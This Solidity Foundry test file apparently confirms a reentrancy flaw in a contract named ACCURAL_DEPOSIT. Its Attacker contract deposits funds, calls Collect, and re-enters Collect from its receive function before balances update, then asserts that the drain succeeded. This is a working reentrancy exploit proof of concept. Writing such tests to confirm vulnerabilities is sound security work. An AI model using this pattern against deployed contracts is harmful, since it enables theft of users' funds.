
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ACCURAL_DEPOSIT} from "../src/ACCURAL_DEPOSIT.sol";

contract TestReentrancyACCURAL_DEPOSIT is Test {
    ACCURAL_DEPOSIT public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ACCURAL_DEPOSIT();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.1 ether);
        vm.assume(attackVal < type(uint128).max / 4);

        // Ensure MinSum is not blocking, and initialization is done
        _contractUnderTest.SetMinSum(0.1 ether);
        _contractUnderTest.Initialized();

        vm.deal(address(_contractUnderTest), attackVal * 3);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}
}

contract Attacker {
    ACCURAL_DEPOSIT public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = ACCURAL_DEPOSIT(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        // Deposit into victim so that our balance is >= MinSum and >= val
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        // Trigger vulnerable Collect
        victim.Collect(val);

        uint256 finalBalance = address(this).balance;
        if (attackCallCount >= 2 && finalBalance > initialSnapshot + val / 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter Collect before state (balances) is updated
            if (address(victim).balance >= storedAttackVal) {
                victim.Collect(storedAttackVal);
            }
        }
    }
}
